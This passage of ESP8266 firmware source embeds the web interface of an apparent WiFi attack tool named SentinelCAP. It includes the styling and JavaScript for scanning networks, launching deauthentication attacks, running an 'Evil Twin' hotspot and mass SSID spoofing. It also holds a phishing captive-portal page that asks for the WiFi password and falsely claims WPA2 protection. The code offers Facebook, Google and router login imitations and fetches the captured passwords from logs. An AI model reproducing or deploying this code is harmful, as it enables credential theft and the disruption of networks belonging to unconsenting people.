    100% { transform: scale(0.8); opacity: 1; }
}

.status-indicator {
    position: relative;
    display: inline-block;
}

.status-indicator::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 100%;
    height: 100%;
    border-radius: 50%;
    opacity: 0.3;
}

.status-active::before {
    background: var(--secondary-color);
    animation: pulse-ring 2s infinite;
}

.status-inactive::before {
    background: var(--danger-color);
}

.nav-item {
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.nav-item::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
    transition: left 0.5s;
}

.nav-item:hover::before {
    left: 100%;
}

.code-editor-container {
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
}

.preview-frame {
    background: white;
    border-radius: 8px;
    box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
}

.floating-panel {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 1000;
    max-width: 90vw;
    max-height: 90vh;
    overflow: auto;
}

.network-card {
    transition: all 0.3s ease;
    border-left: 4px solid transparent;
}

.network-card:hover {
    border-left-color: var(--primary-color);
    transform: translateX(4px);
}

.metric-card {
    background: linear-gradient(135deg, var(--dark-card) 0%, rgba(30, 41, 59, 0.9) 100%);
    transition: transform 0.3s ease;
}

.metric-card:hover {
    transform: translateY(-2px);
}

.file-item {
    transition: all 0.3s ease;
}

.file-item:hover {
    background: rgba(99, 102, 241, 0.1);
    border-color: var(--primary-color);
}

.tab-content {
    display: none;
}

.tab-content.active {
    display: block;
    animation: fadeIn 0.3s ease-in;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

.terminal-output {
    background: #1a1a1a;
    color: #00ff41;
    font-family: 'Fira Code', 'Consolas', monospace;
    padding: 15px;
    border-radius: 8px;
    height: 200px;
    overflow-y: auto;
    border: 1px solid #333;
    font-size: 0.875rem; /* Smaller font for terminal on small screens */
}
@media (min-width: 768px) {
    .terminal-output {
        font-size: 1rem; /* Larger font on larger screens */
    }
}


.progress-bar {
    background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
    transition: width 0.3s ease;
}

/* Ensure input/textarea styles are consistent */
input, textarea, select {
    background-color: var(--dark-card);
    color: var(--text-primary);
    border: 1px solid var(--dark-border);
    padding: 0.75rem;
    border-radius: 0.5rem;
    box-sizing: border-box;
    width: 100%; /* Ensure inputs take full width */
}
input:focus, textarea:focus, select:focus {
    border-color: var(--primary-color);
    outline: none;
}

/* Button base styles */
button {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: 0.75rem 1rem;
    border-radius: 0.5rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    white-space: nowrap;
    text-align: center; /* Ensure text is centered */
}

/* Specific button colors */
.bg-blue-600 { background-color: #2563eb; }
.bg-purple-600 { background-color: #9333ea; }
.bg-green-600 { background-color: #16a34a; }
.bg-red-600 { background-color: #dc2626; }
.bg-orange-600 { background-color: #ea580c; }
.bg-gray-600 { background-color: #4b5563; }

/* Active tab styling */
.nav-item.active-tab {
    background-color: var(--dark-card);
    color: var(--text-primary);
}

/* Remove hover from active tab */
.nav-item.active-tab:hover {
    background-color: var(--dark-card);
}

/* Responsive Navigation (Hamburger Menu) */
.nav-buttons-container {
    display: flex; /* Default to flex for larger screens */
    align-items: center;
    /* space-x-6; This class is applied directly in HTML for larger screens */
}

.hamburger-menu {
    display: none; /* Hidden by default on larger screens */
    font-size: 2rem;
    cursor: pointer;
    color: var(--text-primary);
    padding: 0.5rem;
    border-radius: 0.5rem;
    background-color: var(--dark-card);
}

@media (max-width: 1023px) { /* For screens smaller than large (lg) breakpoint */
    .nav-buttons-container {
        display: none; /* Hide regular nav items by default */
        flex-direction: column;
        position: absolute;
        top: 100%; /* Position below the nav bar */
        left: 0;
        width: 100%;
        background: var(--dark-card);
        border-top: 1px solid var(--dark-border);
        padding: 1rem 0;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        z-index: 40; /* Below sticky nav, above content */
    }
    .nav-buttons-container.active {
        display: flex; /* Show when active */
    }
    .nav-item {
        width: 100%;
        padding: 0.75rem 1.5rem; /* Full width, more padding */
        text-align: left;
        border-radius: 0; /* No rounded corners for full-width items */
    }
    .nav-item:hover {
        background-color: var(--slate-700);
    }
    .hamburger-menu {
        display: block; /* Show hamburger menu */
    }
    .nav-bar-content {
        flex-grow: 1; /* Allow content to take available space */
        justify-content: space-between; /* Push logo left, hamburger right */
    }
    .nav-bar-status {
        display: none; /* Hide status on small screens to save space */
    }
}

/* Adjustments for smaller screens on specific sections */
@media (max-width: 767px) { /* Small screens (md breakpoint) */
    .grid-cols-1.md\:grid-cols-2 {
        grid-template-columns: repeat(1, minmax(0, 1fr)); /* Force single column */
    }
    .lg\:grid-cols-4 {
        grid-template-columns: repeat(1, minmax(0, 1fr)); /* Force single column */
    }
    .lg\:grid-cols-2 {
        grid-template-columns: repeat(1, minmax(0, 1fr)); /* Force single column */
    }
    .metric-card, .glass-effect {
        padding: 1rem; /* Reduce padding on cards */
    }
    h1 {
        font-size: 1.5rem; /* Smaller headings */
    }
    h2 {
        font-size: 1.25rem;
    }
    h3 {
        font-size: 1.1rem;
    }
    .text-2xl {
        font-size: 1.25rem; /* Smaller text for metrics */
    }
    .text-xl {
        font-size: 1rem;
    }
    .nav-item {
        font-size: 0.9rem; /* Smaller nav text */
    }
    .nav-bar-logo {
        flex-shrink: 1; /* Allow logo area to shrink */
    }
    .nav-bar-logo h1 {
        font-size: 1.2rem; /* Smaller logo text */
    }
    .nav-bar-logo p {
        font-size: 0.6rem; /* Smaller sub-text */
    }
    .network-card .flex {
        flex-direction: column; /* Stack network card content vertically */
        align-items: flex-start;
    }
    .network-card .text-right {
        text-align: left;
        margin-top: 0.5rem;
    }
    .network-card .select-network-btn {
        width: 100%; /* Full width button */
        margin-left: 0;
        margin-top: 1rem;
    }
    .file-item .flex {
        flex-direction: column;
        align-items: flex-start;
    }
    .file-item .flex.space-x-2 {
        margin-top: 0.5rem;
        width: 100%;
        justify-content: space-around; /* Distribute buttons */
    }
    .file-item button {
        flex-grow: 1; /* Allow buttons to grow */
        margin: 0.25rem; /* Small margin between buttons */
    }
    .code-editor-container textarea, .preview-frame iframe {
        height: 60vh; /* Adjust height for smaller screens */
    }
    .upload-modal .max-w-md {
        max-width: 90vw; /* Make modal wider on small screens */
    }
}

/* Specific adjustments for the navigation bar */
.nav {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 1rem; /* Default padding */
}
@media (max-width: 1023px) {
    .nav {
        flex-wrap: wrap; /* Allow items to wrap */
    }
    .nav > div:first-child { /* Logo */
        flex-grow: 1;
    }
    .nav > div:last-child { /* Status */
        display: none; /* Hide status on small screens */
    }
}

/* Adjustments for settings tab inputs */
#settings-tab input[type="text"],
#settings-tab input[type="password"],
#settings-tab select {
    width: 100%; /* Ensure they take full width */
}
#settings-tab .grid.grid-cols-1.md\:grid-cols-2 {
    grid-template-columns: 1fr; /* Stack on small screens */
}
@media (min-width: 768px) {
    #settings-tab .grid.grid-cols-1.md\:grid-cols-2 {
        grid-template-columns: repeat(2, minmax(0, 1fr)); /* Two columns on medium screens */
    }
}

)rawliteral";

// script.js
const char SCRIPT_JS[] PROGMEM = R"rawliteral(
// Global state
let currentTab = 'dashboard';
let networks = [];
let selectedNetwork = null;
let isDeauthActive = false;
let isHotspotActive = false;
let capturedPasswords = []; // This will be fetched from ESP8266
let htmlEditorContent = ''; // Content for the textarea editor
let appSettings = {}; // New: To store fetched settings

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeUI();
    loadDefaultTemplate(); // Load default template into editor
    startStatusUpdates(); // Start polling for status
    populateTemplateLibrary(); // Populate template library
    attachEventListeners(); // Attach all event listeners
    fetchFiles(); // Fetch initial file list
    fetchLogs(); // Fetch initial logs
    scanNetworks(); // Initial network scan
    fetchSettings(); // New: Fetch settings on startup
});

// --- UI Initialization and Tab Management ---
function initializeUI() {
    // Set initial active tab
    showTab('dashboard');
}

function showTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Remove active class from nav items
    document.querySelectorAll('.nav-item').forEach(nav => {
        nav.classList.remove('active-tab', 'bg-slate-700');
        nav.classList.add('hover:bg-slate-700'); // Ensure hover state is correct
    });
    
    // Show selected tab
    document.getElementById(tabName + '-tab').classList.add('active');
    
    // Add active class to nav item
    const activeNavItem = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
    if (activeNavItem) {
        activeNavItem.classList.add('active-tab', 'bg-slate-700');
        activeNavItem.classList.remove('hover:bg-slate-700');
    }
    
    currentTab = tabName;

    // Special handling for captive editor tab to update preview
    if (currentTab === 'captive-editor') {
        previewTemplate();
    }
    // Special handling for file manager to refresh files
    if (currentTab === 'filemanager') {
        fetchFiles();
    }
    // Special handling for logs to refresh logs
    if (currentTab === 'logs') {
        fetchLogs();
    }
    // Special handling for settings to refresh settings
    if (currentTab === 'settings') {
        fetchSettings();
    }
}

function attachEventListeners() {
    // Navigation buttons
    document.getElementById('nav-buttons').addEventListener('click', (event) => {
        const target = event.target.closest('.nav-item');
        if (target) {
            showTab(target.dataset.tab);
        }
    });

    // Hamburger menu toggle
    const hamburgerMenu = document.getElementById('hamburger-menu');
    const navButtonsContainer = document.getElementById('nav-buttons');

    if (hamburgerMenu && navButtonsContainer) {
        hamburgerMenu.addEventListener('click', () => {
            navButtonsContainer.classList.toggle('active');
        });
    }

    // Close mobile menu when a nav item is clicked
    navButtonsContainer.addEventListener('click', (event) => {
        const target = event.target.closest('.nav-item');
        if (target) {
            showTab(target.dataset.tab);
            // Close the mobile menu after selection
            if (navButtonsContainer.classList.contains('active')) {
                navButtonsContainer.classList.remove('active');
            }
        }
    });

    // Dashboard Quick Actions
    document.getElementById('quick-scan-btn').addEventListener('click', () => {
        showTab('scanner');
        scanNetworks();
    });
    document.getElementById('edit-captive-btn').addEventListener('click', () => showTab('captive-editor'));
    document.getElementById('generate-report-btn').addEventListener('click', generateReport);
    document.getElementById('deselect-network-btn').addEventListener('click', deselectNetwork); // <--- TAMBAHAN BARU

    // Scanner Tab
    document.getElementById('refresh-scan-btn').addEventListener('click', scanNetworks);

    // Attack Tab
    document.getElementById('deauth-btn').addEventListener('click', toggleDeauth);
    document.getElementById('hotspot-btn').addEventListener('click', toggleHotspot);
    document.getElementById('start-mass-spoofing-btn').addEventListener('click', startMassSpoofing);

    // Captive Portal Editor Tab
    document.getElementById('load-template-btn').addEventListener('click', loadTemplate);
    document.getElementById('save-template-btn').addEventListener('click', saveTemplate);
    document.getElementById('update-preview-btn').addEventListener('click', previewTemplate);
    document.getElementById('deploy-template-btn').addEventListener('click', deployTemplate);
    document.getElementById('html-editor').addEventListener('input', debounce(previewTemplate, 500)); // Debounce input for live preview

    // File Manager Tab
    document.getElementById('show-upload-modal-btn').addEventListener('click', showUploadModal);
    document.getElementById('cancel-upload-btn').addEventListener('click', closeUploadModal);
    document.getElementById('file-input').addEventListener('change', handleFileUpload);
    document.getElementById('file-drop-area').addEventListener('click', () => document.getElementById('file-input').click());
    document.getElementById('file-drop-area').addEventListener('dragover', (e) => {
        e.preventDefault();
        e.currentTarget.classList.add('border-blue-500');
    });
    document.getElementById('file-drop-area').addEventListener('dragleave', (e) => {
        e.currentTarget.classList.remove('border-blue-500');
    });
    document.getElementById('file-drop-area').addEventListener('drop', (e) => {
        e.preventDefault();
        e.currentTarget.classList.remove('border-blue-500');
        const fileInput = document.getElementById('file-input');
        fileInput.files = e.dataTransfer.files;
        handleFileUpload();
    });


    // Logs Tab
    document.getElementById('clear-logs-btn').addEventListener('click', clearLogs);
    document.getElementById('download-logs-btn').addEventListener('click', downloadLogs);

    // New: Settings Tab
    document.getElementById('save-settings-btn').addEventListener('click', saveSettings);
}

// --- Captive Portal Editor Functions ---
function loadDefaultTemplate() {
    const defaultTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2em;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="password"]:focus, input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }
        .connect-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .connect-btn:hover {
            transform: translateY(-2px);
        }
        .security-note {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">📶</div>
        <h1>Connect to {SSID}</h1>
        <p class="subtitle">Please enter your network password to continue</p>
        
        <form action="/submit_password" method="post">
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your WiFi password">
            </div>
            
            <button type="submit" class="connect-btn">Connect to Network</button>
        </form>
        
        <p class="security-note">
            🔒 Your connection is secured with WPA2 encryption
        </p>
    </div>
</body>
</html>`;

    document.getElementById('html-editor').value = defaultTemplate;
    previewTemplate();
}

function loadTemplate() {
    const selectedTemplate = document.getElementById('template-select').value;
    let template = '';

    switch(selectedTemplate) {
        case 'facebook':
            template = getFacebookTemplate();
            break;
        case 'google':
            template = getGoogleTemplate();
            break;
        case 'router':
            template = getRouterTemplate();
            break;
        case 'default':
            loadDefaultTemplate();
            return;
        default: // Custom template from library
            const customTemplate = localStorage.getItem(`template_${selectedTemplate}`);
            if (customTemplate) {
                template = customTemplate;
            } else {
                showNotification('Template not found!', 'error');
                return;
            }
            break;
    }

    document.getElementById('html-editor').value = template;
    previewTemplate();
}

function previewTemplate() {
    let html = document.getElementById('html-editor').value;
    
    // Replace template variables
    html = html.replace(/{SSID}/g, selectedNetwork ? selectedNetwork.ssid : 'MyNetwork');
    html = html.replace(/{DEVICE_NAME}/g, 'SentinelCAP');
    html = html.replace(/{CURRENT_TIME}/g, new Date().toLocaleTimeString());
    html = html.replace(/{CUSTOM_MESSAGE}/g, 'Please authenticate to continue');

    const iframe = document.getElementById('preview-iframe');
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(html);
    doc.close();
}

function saveTemplate() {
    const templateName = prompt('Enter template name:');
    if (templateName) {
        const html = document.getElementById('html-editor').value;
        localStorage.setItem(`template_${templateName}`, html);
        addToTerminal(`[INFO] Template '${templateName}' saved successfully`);
        populateTemplateLibrary();
        showNotification('Template saved successfully!', 'success');
    }
}

async function deployTemplate() {
    const html = document.getElementById('html-editor').value;
    const filename = 'captive_portal_template.html'; // Fixed filename for deployment

    const formData = new FormData();
    const blob = new Blob([html], { type: 'text/html' });
    formData.append('uploadFile', blob, filename);

    try {
        addToTerminal(`[INFO] Deploying template to ${filename}...`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Template deployed successfully!', 'success');
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to deploy template: ${errorText}`);
            showNotification('Failed to deploy template!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during deployment: ${error.message}`);
        showNotification('Network error during deployment!', 'error');
    }
}

function populateTemplateLibrary() {
    const library = document.getElementById('template-library');
    library.innerHTML = '';

    // Add built-in templates
    const builtinTemplates = [
        { name: 'Default', description: 'Simple and clean design' },
        { name: 'Facebook', description: 'Facebook-style login page' },
        { name: 'Google', description: 'Google WiFi style' },
        { name: 'Router', description: 'Router admin panel style' }
    ];

    builtinTemplates.forEach(template => {
        const card = createTemplateCard(template.name, template.description, false);
        library.appendChild(card);
    });

    // Add custom templates from localStorage
    Object.keys(localStorage).forEach(key => {
        if (key.startsWith('template_')) {
            const name = key.replace('template_', '');
            const card = createTemplateCard(name, 'Custom template', true);
            library.appendChild(card);
        }
    });
}

function createTemplateCard(name, description, isCustom) {
    const card = document.createElement('div');
    card.className = 'bg-slate-800 rounded-lg p-4 hover:bg-slate-700 transition-all duration-300 cursor-pointer';
    
    card.innerHTML = `
        <h4 class="font-semibold text-white mb-2">${name}</h4>
        <p class="text-gray-400 text-sm mb-3">${description}</p>
        <div class="flex justify-between">
            <button data-template-name="${name}" class="load-template-from-library-btn bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm">
                Load
            </button>
            ${isCustom ? `<button data-template-name="${name}" class="delete-template-btn bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm">Delete</button>` : ''}
        </div>
    `;
    
    // Attach event listeners to buttons within the card
    card.querySelector('.load-template-from-library-btn').addEventListener('click', (e) => {
        loadTemplateFromLibrary(e.target.dataset.templateName);
    });
    if (isCustom) {
        card.querySelector('.delete-template-btn').addEventListener('click', (e) => {
            deleteTemplate(e.target.dataset.templateName);
        });
    }
    
    return card;
}

function loadTemplateFromLibrary(name) {
    document.getElementById('template-select').value = name; // Update dropdown
    loadTemplate(); // Call loadTemplate to load the content
}

function deleteTemplate(name) {
    if (confirm(`Are you sure you want to delete template '${name}'?`)) {
        localStorage.removeItem(`template_${name}`);
        populateTemplateLibrary();
        addToTerminal(`[INFO] Template '${name}' deleted`);
        showNotification('Template deleted!', 'success');
    }
}

// --- Network Scanning Functions ---
async function scanNetworks() {
    addToTerminal('[SCAN] Starting WiFi network scan...');
    try {
        const response = await fetch('/api/scan');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        networks = await response.json();
        renderNetworks();
        addToTerminal(`[SCAN] Found ${networks.length} networks`);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to scan networks: ${error.message}`);
        console.error("Error scanning networks:", error);
        showNotification('Failed to scan networks!', 'error');
    }
}

function renderNetworks() {
    const networksList = document.getElementById('networks-list');
    networksList.innerHTML = '';

    if (networks.length === 0) {
        networksList.innerHTML = '<p class="text-gray-400 text-center">No networks found. Try refreshing the scan.</p>';
        return;
    }

    networks.forEach((network, index) => {
        const networkCard = document.createElement('div');
        networkCard.className = `network-card glass-effect rounded-lg p-4 cursor-pointer transition-all duration-300 ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'border-l-blue-500' : ''}`;
        
        const signalStrength = getSignalStrength(network.rssi);
        const securityColor = network.security === 'Open' ? 'text-red-400' : 'text-green-400';
        
        networkCard.innerHTML = `
            <div class="flex items-center justify-between">
                <div class="flex-1">
                    <div class="flex items-center space-x-3">
                        <div class="text-2xl">${signalStrength.icon}</div>
                        <div>
                            <h3 class="text-white font-semibold">${network.ssid}</h3>
                            <p class="text-gray-400 text-sm">${network.bssid}</p>
                        </div>
                    </div>
                </div>
                <div class="text-right">
                    <div class="text-sm text-gray-300">Ch. ${network.channel}</div>
                    <div class="text-sm ${securityColor}">${network.security}</div>
                    <div class="text-sm text-gray-400">${network.rssi} dBm</div>
                </div>
                <button data-bssid="${network.bssid}" class="select-network-btn ml-4 px-4 py-2 rounded-lg ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'bg-green-600' : 'bg-blue-600'} text-white hover:opacity-80 transition-all duration-300">
                    ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'Selected' : 'Select'}
                </button>
            </div>
        `;
        
        networksList.appendChild(networkCard);
    });

    // Attach event listeners to newly rendered select buttons
    networksList.querySelectorAll('.select-network-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            const bssidToSelect = e.target.dataset.bssid;
            const networkToSelect = networks.find(net => net.bssid === bssidToSelect);
            if (networkToSelect) {
                selectNetwork(networkToSelect);
            }
        });
    });
}

async function selectNetwork(network) {
    selectedNetwork = network;
    document.getElementById('target-ssid').textContent = selectedNetwork.ssid;
    renderNetworks(); // Re-render to update 'Selected' button state
    addToTerminal(`[INFO] Selected network: ${selectedNetwork.ssid}`);

    try {
        const response = await fetch('/api/select_network', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bssid: selectedNetwork.bssid })
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        addToTerminal(`[INFO] ESP8266 acknowledged selection: ${result.message}`);
        showNotification('Network selected successfully!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to send selection to ESP8266: ${error.message}`);
        console.error("Error sending selection:", error);
        showNotification('Failed to select network on device!', 'error');
    }
}

function getSignalStrength(rssi) {
    if (rssi > -50) return { icon: '📶', class: 'text-green-400' };
    if (rssi > -60) return { icon: '📶', class: 'text-yellow-400' };
    if (rssi > -70) return { icon: '📶', class: 'text-orange-400' };
    return { icon: '📶', class: 'text-red-400' };
}

// --- Attack Functions ---
async function toggleDeauth() {
    if (!selectedNetwork || !selectedNetwork.ssid) {
        showNotification('Please select a target network first', 'error');
        return;
    }

    try {
        const response = await fetch('/api/toggle_deauth', { method: 'POST' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isDeauthActive = result.deauth_active;
        updateDeauthUI();
        addToTerminal(`[DEAUTH] Deauth attack ${isDeauthActive ? 'started' : 'stopped'} on ${selectedNetwork.ssid}`);
        showNotification(`Deauth attack ${isDeauthActive ? 'started' : 'stopped'}!`, isDeauthActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle deauth: ${error.message}`);
        console.error("Error toggling deauth:", error);
        showNotification('Failed to toggle deauth!', 'error');
    }
}

function updateDeauthUI() {
    const btn = document.getElementById('deauth-btn');
    const status = document.getElementById('deauth-status');
    if (isDeauthActive) {
        btn.textContent = 'Stop Deauth Attack';
        btn.className = 'w-full bg-red-700 hover:bg-red-800 text-white py-3 px-4 rounded-lg transition-all duration-300';
        status.innerHTML = '<span class="text-green-400">Active</span>';
    } else {
        btn.textContent = 'Start Deauth Attack';
        btn.className = 'w-full bg-red-600 hover:bg-red-700 text-white py-3 px-4 rounded-lg transition-all duration-300';
        status.innerHTML = '<span class="text-red-400">Stopped</span>';
    }
}

async function toggleHotspot() {
    if (!selectedNetwork || !selectedNetwork.ssid) {
        showNotification('Please select a target network first', 'error');
        return;
    }

    try {
        const response = await fetch('/api/toggle_hotspot', { method: 'POST' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isHotspotActive = result.hotspot_active;
        updateHotspotUI();
        addToTerminal(`[HOTSPOT] Evil Twin ${isHotspotActive ? 'started' : 'stopped'} for ${selectedNetwork.ssid}`);
        showNotification(`Evil Twin ${isHotspotActive ? 'started' : 'stopped'}!`, isHotspotActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle hotspot: ${error.message}`);
        console.error("Error toggling hotspot:", error);
        showNotification('Failed to toggle hotspot!', 'error');
    }
}

function updateHotspotUI() {
    const btn = document.getElementById('hotspot-btn');
    const status = document.getElementById('hotspot-status');
    if (isHotspotActive) {
        btn.textContent = 'Stop Evil Twin';
        btn.className = 'w-full bg-purple-700 hover:bg-purple-800 text-white py-3 px-4 rounded-lg transition-all duration-300';
        status.innerHTML = '<span class="text-green-400">Active</span>';
    } else {
        btn.textContent = 'Start Evil Twin';
        btn.className = 'w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg transition-all duration-300';
        status.innerHTML = '<span class="text-red-400">Inactive</span>';
    }
}

async function startMassSpoofing() {
    const ssidList = document.getElementById('ssid-list').value;
    if (!ssidList.trim()) {
        showNotification('Please enter at least one SSID', 'error');
        return;
    }

    const ssids = ssidList.split('\n').filter(ssid => ssid.trim());
    addToTerminal(`[SPOOF] Starting mass spoofing with ${ssids.length} SSIDs`);

    try {
        const response = await fetch('/api/mass_spoofing', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ssid_list: ssidList })
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        addToTerminal(`[SPOOF] ${result.message}`);
        showNotification('Mass spoofing command sent!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to start mass spoofing: ${error.message}`);
        console.error("Error starting mass spoofing:", error);
        showNotification('Failed to start mass spoofing!', 'error');
    }
}

// --- File Management Functions ---
function showUploadModal() {
    document.getElementById('upload-modal').classList.remove('hidden');
}

function closeUploadModal() {
    document.getElementById('upload-modal').classList.add('hidden');
    document.getElementById('file-input').value = ''; // Clear selected file
}

async function handleFileUpload() {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    if (!file) {
        showNotification('No file selected!', 'warning');
        return;
    }

    const formData = new FormData();
    formData.append('uploadFile', file, file.name);

    try {
        addToTerminal(`[FILE] Uploading: ${file.name} (${file.size} bytes)`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}`);
            showNotification('File uploaded successfully!', 'success');
            closeUploadModal();
            fetchFiles(); // Refresh file list
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to upload file: ${errorText}`);
            showNotification('Failed to upload file!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during upload: ${error.message}`);
        showNotification('Network error during upload!', 'error');
    }
}

async function fetchFiles() {
    try {
        const response = await fetch('/api/files');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const files = await response.json();
        renderFiles(files);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch files: ${error.message}`);
        console.error("Error fetching files:", error);
        showNotification('Failed to load files!', 'error');
    }
}

function renderFiles(files) {
    const filesList = document.getElementById('files-list');
    filesList.innerHTML = '';

    if (files.length === 0) {
        filesList.innerHTML = '<p class="text-gray-400 text-center">No files found on device.</p>';
        return;
    }

    files.forEach(file => {
        const fileItem = document.createElement('div');
        fileItem.className = 'file-item glass-effect rounded-lg p-4 flex items-center justify-between border border-slate-600';
        
        const fileIcon = getFileIcon(file.type);
        
        fileItem.innerHTML = `
            <div class="flex items-center space-x-3">
                <div class="text-2xl">${fileIcon}</div>
                <div>
                    <h4 class="text-white font-semibold">${file.name}</h4>
                    <p class="text-gray-400 text-sm">${file.size} bytes</p>
                </div>
            </div>
            <div class="flex space-x-2">
                <button data-filename="${file.name}" class="preview-file-btn bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm">
                    Preview
                </button>
                <button data-filename="${file.name}" class="delete-file-btn bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm">
                    Delete
                </button>
            </div>
        `;
        
        filesList.appendChild(fileItem);
    });

    // Attach event listeners to newly rendered buttons
    filesList.querySelectorAll('.preview-file-btn').forEach(button => {
        button.addEventListener('click', (e) => previewFile(e.target.dataset.filename));
    });
    filesList.querySelectorAll('.delete-file-btn').forEach(button => {
        button.addEventListener('click', (e) => deleteFile(e.target.dataset.filename));
    });
}

function getFileIcon(type) {
    switch(type) {
        case 'html': return '🌐';
        case 'json': return '📋';
        case 'log': return '📄';
        case 'javascript': return '📜';
        case 'css': return '🎨';
        case 'text': return '📝';
        default: return '📁';
    }
}

function previewFile(filename) {
    addToTerminal(`[FILE] Previewing: ${filename}`);
    // Open file in new tab (assuming it's a web-viewable file like HTML, CSS, JS, TXT)
    window.open(`/${filename}`, '_blank');
}

async function deleteFile(filename) {
    if (confirm(`Are you sure you want to delete ${filename}?`)) {
        try {
            const response = await fetch('/deletefile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ filename: filename })
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}: ${filename}`);
            showNotification('File deleted successfully!', 'success');
            fetchFiles(); // Refresh file list
        } catch (error) {
            addToTerminal(`[ERROR] Failed to delete file: ${error.message}`);
            console.error("Error deleting file:", error);
            showNotification('Failed to delete file!', 'error');
        }
    }
}

// --- Log Management Functions ---
async function fetchLogs() {
    try {
        const response = await fetch('/api/logs');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const logs = await response.json();
        capturedPasswords = logs.passwords.split('\n').filter(line => line.trim() !== ''); // Filter empty lines
        renderPasswordLogs();
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch logs: ${error.message}`);
